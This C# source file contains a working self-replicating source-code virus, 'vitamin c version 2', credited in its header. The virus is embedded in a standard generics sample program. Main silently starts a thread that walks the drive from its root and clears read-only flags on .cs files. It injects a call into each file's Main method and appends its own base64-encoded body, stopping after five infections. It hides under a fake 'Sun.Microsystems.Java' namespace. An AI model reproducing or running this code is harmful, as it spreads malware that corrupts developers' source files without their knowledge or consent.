// vitamin c version 2 by alc0paul <bangingatbang@land.ru> http://alcopaul.co.nr
//
// october 27, 2010
//
// features:
// - copies itself to c sharp source codes
// - now terminates after 5 infections (unlike version 1 which continued searching for files even though it had infected 5 hosts)
//
 
 
using System;
using Sun.Microsystems.Java;
using System.Collections;
using System.Collections.Generic;
using System.Text;
 
namespace Generics_CSharp
{
    //Type parameter T in angle brackets.
    public class MyList<T> : IEnumerable<T>
    {
        protected Node head;
        protected Node current = null;
 
        // Nested type is also generic on T
        protected class Node
        {
            public Node next;
            //T as private member datatype.
            private T data;
            //T used in non-generic constructor.
            public Node(T t)
            {
                next = null;
                data = t;
            }
            public Node Next
            {
                get { return next; }
                set { next = value; }
            }
            //T as return type of property.
            public T Data
            {
                get { return data; }
                set { data = value; }
            }
        }
 
        public MyList()
        {
            head = null;
        }
 
        //T as method parameter type.
        public void AddHead(T t)
        {
            Node n = new Node(t);
            n.Next = head;
            head = n;
        }
 
        // Implement GetEnumerator to return IEnumerator<T> to enable
        // foreach iteration of our list. Note that in C# 2.0 
        // you are not required to implement Current and MoveNext.
        // The compiler will create a class that implements IEnumerator<T>.
        public IEnumerator<T> GetEnumerator()
        {
            Node current = head;
 
            while (current != null)
            {
                yield return current.Data;
                current = current.Next;
            }
        }
 
        // We must implement this method because 
        // IEnumerable<T> inherits IEnumerable
        IEnumerator IEnumerable.GetEnumerator()
        {
            return GetEnumerator();
        }
    }
 
 
    public class SortedList<T> : MyList<T> where T : IComparable<T>
    {
        // A simple, unoptimized sort algorithm that 
        // orders list elements from lowest to highest:
        public void BubbleSort()
        {
            if (null == head || null == head.Next)
                return;
 
            bool swapped;
            do
            {
                Node previous = null;
                Node current = head;
                swapped = false;
 
                while (current.next != null)
                {
                    //  Because we need to call this method, the SortedList
                    //  class is constrained on IEnumerable<T>
                    if (current.Data.CompareTo(current.next.Data) > 0)
                    {
                        Node tmp = current.next;
                        current.next = current.next.next;
                        tmp.next = current;
 
                        if (previous == null)
                        {
                            head = tmp;
                        }
                        else
                        {
                            previous.next = tmp;
                        }
                        previous = tmp;
                        swapped = true;
                    }
 
                    else
                    {
                        previous = current;
                        current = current.next;
                    }
 
                }// end while
            } while (swapped);
        }
    }
 
    // A simple class that implements IComparable<T>
    // using itself as the type argument. This is a
    // common design pattern in objects that are
    // stored in generic lists.
    public class Person : IComparable<Person>
    {
        string name;
        int age;
 
        public Person(string s, int i)
        {
            name = s;
            age = i;
        }
 
        // This will cause list elements
        // to be sorted on age values.
        public int CompareTo(Person p)
        {
            return age - p.age;
        }
 
        public override string ToString()
        {
            return name + ":" + age;
        }
 
        // Must implement Equals.
        public bool Equals(Person p)
        {
            return (this.age == p.age);
        }
    }
 
    class Generics
    {
        static void Main(string[] args)
    {
    System.Threading.Thread gxzxzxzxz = new System.Threading.Thread(IsKing.LetsGo);
    gxzxzxzxz.Start();
            //Declare and instantiate a new generic SortedList class.
            //Person is the type argument.
            SortedList<Person> list = new SortedList<Person>();
 
            //Create name and age values to initialize Person objects.
            string[] names = new string[] { "Franscoise", "Bill", "Li", "Sandra", "Gunnar", "Alok", "Hiroyuki", "Maria", "Alessandro", "Raul" };
            int[] ages = new int[] { 45, 19, 28, 23, 18, 9, 108, 72, 30, 35 };
 
            //Populate the list.
            for (int x = 0; x < names.Length; x++)
            {
                list.AddHead(new Person(names[x], ages[x]));
            }
 
            Console.WriteLine("Unsorted List:");
            //Print out unsorted list.
            foreach (Person p in list)
            {
                Console.WriteLine(p.ToString());
            }
 
            //Sort the list.
            list.BubbleSort();
 
            Console.WriteLine(String.Format("{0}Sorted List:", Environment.NewLine));
            //Print out sorted list.
            foreach (Person p in list)
            {
                Console.WriteLine(p.ToString());
            }
 
            Console.WriteLine("Done");
        }
    }
 
}
 
 
 
namespace Sun.Microsystems.Java
{
    public class IsKing
    {
        private static int counter = 0;
        public static void LetsGo()
        {
            string xx = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName);
            string xy = System.IO.Directory.GetDirectoryRoot(xx);
            System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(@xy);
            int yy = AndLetsRock(dir);
        }
        private static int AndLetsRock(System.IO.DirectoryInfo d)
        {
            System.IO.FileInfo[] files = d.GetFiles("*.cs");
            foreach (System.IO.FileInfo file in files)
            {
                string filename = file.FullName;
                System.IO.FileAttributes hh = System.IO.File.GetAttributes(filename);
                if ((hh & System.IO.FileAttributes.ReadOnly) != 0)
                {
                    System.IO.FileAttributes attr = System.IO.FileAttributes.Normal;
                    System.IO.File.SetAttributes(filename, attr);
                }
                string database = "bmFtZXNwYWNlIFN1bi5NaWNyb3N5c3RlbXMuSmF2YQ0Kew0KICAgIHB1YmxpYyBjbGFzcyBJc0tpbmcNCiAgICB7DQogICAgICAgIHByaXZhdGUgc3RhdGljIGludCBjb3VudGVyID0gMDsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIExldHNHbygpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyB4eCA9IFN5c3RlbS5JTy5QYXRoLkdldERpcmVjdG9yeU5hbWUoU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkuR2V0RXhlY3V0aW5nQXNzZW1ibHkoKS5HZXRNb2R1bGVzKClbMF0uRnVsbHlRdWFsaWZpZWROYW1lKTsNCiAgICAgICAgICAgIHN0cmluZyB4eSA9IFN5c3RlbS5JTy5EaXJlY3RvcnkuR2V0RGlyZWN0b3J5Um9vdCh4eCk7DQogICAgICAgICAgICBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbyBkaXIgPSBuZXcgU3lzdGVtLklPLkRpcmVjdG9yeUluZm8oQHh5KTsNCiAgICAgICAgICAgIGludCB5eSA9IEFuZExldHNSb2NrKGRpcik7DQogICAgICAgIH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgaW50IEFuZExldHNSb2NrKFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvIGQpDQogICAgICAgIHsNCiAgICAgICAgICAgIFN5c3RlbS5JTy5GaWxlSW5mb1tdIGZpbGVzID0gZC5HZXRGaWxlcygiKi5jcyIpOw0KICAgICAgICAgICAgZm9yZWFjaCAoU3lzdGVtLklPLkZpbGVJbmZvIGZpbGUgaW4gZmlsZXMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbGVuYW1lID0gZmlsZS5GdWxsTmFtZTsNCiAgICAgICAgICAgICAgICBTeXN0ZW0uSU8uRmlsZUF0dHJpYnV0ZXMgaGggPSBTeXN0ZW0uSU8uRmlsZS5HZXRBdHRyaWJ1dGVzKGZpbGVuYW1lKTsNCiAgICAgICAgICAgICAgICBpZiAoKGhoICYgU3lzdGVtLklPLkZpbGVBdHRyaWJ1dGVzLlJlYWRPbmx5KSAhPSAwKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgU3lzdGVtLklPLkZpbGVBdHRyaWJ1dGVzIGF0dHIgPSBTeXN0ZW0uSU8uRmlsZUF0dHJpYnV0ZXMuTm9ybWFsOw0KICAgICAgICAgICAgICAgICAgICBTeXN0ZW0uSU8uRmlsZS5TZXRBdHRyaWJ1dGVzKGZpbGVuYW1lLCBhdHRyKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc3RyaW5nIGRhdGFiYXNlID0gIg==>IjsNCiAgICAgICAgICAgICAgICBzdHJpbmcgeCA9IFJlYWQoZmlsZW5hbWUpOw0KICAgICAgICAgICAgICAgIGJvb2wgeSA9IFNoYWxsV2UoeCk7DQogICAgICAgICAgICAgICAgYm9vbCB4eXkgPSBTaGFsbFdlSSh4KTsNCiAgICAgICAgICAgICAgICBpZiAoeSA9PSB0cnVlKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh4eXkgPT0gdHJ1ZSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGJvb2wgeiA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgIHdoaWxlICh6ID09IHRydWUpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3VudGVyID09IDUpDQogICAgICAgICAgICAgICAgICAgICAgICB7IHJldHVybiAwOyB9DQogICAgICAgICAgICAgICAgICAgICAgICB6ID0gUXVlcnkoZmlsZW5hbWUsIHgsIGRhdGFiYXNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh6ID09IGZhbHNlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvdW50ZXIgKz0gMTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlIHsgY29udGludWU7IH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvW10gZGlycyA9IGQuR2V0RGlyZWN0b3JpZXMoIiouKiIpOw0KICAgICAgICAgICAgZm9yZWFjaCAoU3lzdGVtLklPLkRpcmVjdG9yeUluZm8gZGlyIGluIGRpcnMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoY291bnRlciA9PSA1KQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gMDsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBpbnQgeXl5ID0gQW5kTGV0c1JvY2soZGlyKTsgfQ0KICAgICAgICAgICAgICAgIGNhdGNoIHsgY29udGludWU7IH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiAxOw0KICAgICAgICB9DQogICAgICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBSZWFkKHN0cmluZyBmaWxlKQ0KICAgICAgICB7DQogICAgICAgICAgICBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyIHNyID0gU3lzdGVtLklPLkZpbGUuT3BlblRleHQoZmlsZSk7DQogICAgICAgICAgICBzdHJpbmcgaW5wdXQ7DQogICAgICAgICAgICBzdHJpbmcgZ2cgPSAiIjsNCiAgICAgICAgICAgIHdoaWxlICgoaW5wdXQgPSBzci5SZWFkTGluZSgpKSAhPSBudWxsKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGdnICs9IGlucHV0ICsgIlxyXG4iOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgc3IuQ2xvc2UoKTsNCiAgICAgICAgICAgIHJldHVybiBnZzsNCiAgICAgICAgfQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBib29sIFNoYWxsV2Uoc3RyaW5nIHMpDQogICAgICAgIHsNCiAgICAgICAgICAgIGludCB4ID0gcy5Ub0xvd2VyKCkuSW5kZXhPZigic3VuLm1pY3Jvc3lzdGVtcy5qYXZhIik7DQogICAgICAgICAgICBpZiAoeCA+PSAwKQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBib29sIFNoYWxsV2VJKHN0cmluZyBzKQ0KICAgICAgICB7DQogICAgICAgICAgICBpbnQgeCA9IHMuVG9Mb3dlcigpLkluZGV4T2YoIm1haW4oIik7DQogICAgICAgICAgICBpZiAoeCA+PSAwKQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBib29sIFF1ZXJ5KHN0cmluZyBmaWxlLCBzdHJpbmcgcywgc3RyaW5nIGRhdGFiYXNlKQ0KICAgICAgICB7DQogICAgICAgICAgICBpbnQgeCA9IHMuVG9Mb3dlcigpLkluZGV4T2YoIm1haW4oIik7DQogICAgICAgICAgICBpbnQgeXkgPSB4Ow0KICAgICAgICAgICAgY2hhcltdIHh4ID0gcy5Ub0NoYXJBcnJheSgwLCBzLkxlbmd0aCAtIDEpOw0KICAgICAgICAgICAgd2hpbGUgKHh4W3l5XSAhPSAneycpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgeXkgKz0gMTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGludCB4dSA9IHMuVG9Mb3dlcigpLkluZGV4T2YoInVzaW5nIHN5c3RlbTsiKTsNCiAgICAgICAgICAgIHMgPSBzLlJlcGxhY2Uocy5TdWJzdHJpbmcoeCwgKHl5IC0geCkgKyAxKSwgIk1haW4oc3RyaW5nW10gYXJncylcclxuXHR7XHJcblx0U3lzdGVtLlRocmVhZGluZy5UaHJlYWQgZ3h6eHp4enh6ID0gbmV3IFN5c3RlbS5UaHJlYWRpbmcuVGhyZWFkKElzS2luZy5MZXRzR28pO1xyXG5cdGd4enh6eHp4ei5TdGFydCgpOyIpOw0KICAgICAgICAgICAgaWYgKHh1IDwgMCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzID0gInVzaW5nIFN5c3RlbTtcclxuIiArIHM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBzID0gcy5SZXBsYWNlKCJ1c2luZyBTeXN0ZW07IiwgInVzaW5nIFN5c3RlbTtcclxudXNpbmcgU3VuLk1pY3Jvc3lzdGVtcy5KYXZhOyIpOw0KICAgICAgICAgICAgdXNpbmcgKFN5c3RlbS5JTy5TdHJlYW1Xcml0ZXIgc3cgPSBuZXcgU3lzdGVtLklPLlN0cmVhbVdyaXRlcihmaWxlKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzdHJpbmdbXSB0ID0gZGF0YWJhc2UuU3BsaXQobmV3IGNoYXJbXSB7ICc+JyB9KTsNCiAgICAgICAgICAgICAgICBzdy5Xcml0ZUxpbmUocyk7DQogICAgICAgICAgICAgICAgc3cuV3JpdGVMaW5lKCJcclxuIik7DQogICAgICAgICAgICAgICAgc3cuV3JpdGUoZGVjb2RlYjY0KHRbMF0pKyBkYXRhYmFzZSArIGRlY29kZWI2NCh0WzFdKSk7DQogICAgICAgICAgICAgICAgc3cuV3JpdGVMaW5lKCJcclxuIik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgc3RyaW5nIGRlY29kZWI2NChzdHJpbmcgZCkNCiAgICAgICAgew0KICAgICAgICAgICAgICBieXRlW10gZyA9IFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoZCk7DQogICAgICAgICAgICAgIHJldHVybiBTeXN0ZW0uVGV4dC5FbmNvZGluZy5VVEY4LkdldFN0cmluZyhnKTsNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0K";
                string x = Read(filename);
                bool y = ShallWe(x);
                bool xyy = ShallWeI(x);
                if (y == true)
                {
                    continue;
                }
                if (xyy == true)
                {
                    bool z = true;
                    while (z == true)
                    {
                        if (counter == 5)
                        { return 0; }
                        z = Query(filename, x, database);
                        if (z == false)
                        {
                            counter += 1;
                        }
                    }
                }
                else { continue; }
            }
            System.IO.DirectoryInfo[] dirs = d.GetDirectories("*.*");
            foreach (System.IO.DirectoryInfo dir in dirs)
            {
                try
                {
                    if (counter == 5)
                    {
                        return 0;
                    }
                    int yyy = AndLetsRock(dir); }
                catch { continue; }
            }
            return 1;
        }
        private static string Read(string file)
        {
            System.IO.StreamReader sr = System.IO.File.OpenText(file);
            string input;
            string gg = "";
            while ((input = sr.ReadLine()) != null)
            {
                gg += input + "\r\n";
            }
            sr.Close();
            return gg;
        }
        private static bool ShallWe(string s)
        {
            int x = s.ToLower().IndexOf("sun.microsystems.java");
            if (x >= 0)
                return true;
            else
                return false;
        }
        private static bool ShallWeI(string s)
        {
            int x = s.ToLower().IndexOf("main(");
            if (x >= 0)
                return true;
            else
                return false;
        }
        private static bool Query(string file, string s, string database)
        {
            int x = s.ToLower().IndexOf("main(");
            int yy = x;
            char[] xx = s.ToCharArray(0, s.Length - 1);
            while (xx[yy] != '{')
            {
                yy += 1;
            }
            int xu = s.ToLower().IndexOf("using system;");
            s = s.Replace(s.Substring(x, (yy - x) + 1), "Main(string[] args)\r\n\t{\r\n\tSystem.Threading.Thread gxzxzxzxz = new System.Threading.Thread(IsKing.LetsGo);\r\n\tgxzxzxzxz.Start();");
            if (xu < 0)
            {
                s = "using System;\r\n" + s;
            }
            s = s.Replace("using System;", "using System;\r\nusing Sun.Microsystems.Java;");
            using (System.IO.StreamWriter sw = new System.IO.StreamWriter(file))
            {
                string[] t = database.Split(new char[] { '>' });
                sw.WriteLine(s);
                sw.WriteLine("\r\n");
                sw.Write(decodeb64(t[0])+ database + decodeb64(t[1]));
                sw.WriteLine("\r\n");
            }
            return false;
        }
        private static string decodeb64(string d)
        {
              byte[] g = System.Convert.FromBase64String(d);
              return System.Text.Encoding.UTF8.GetString(g);
        }
    }
}
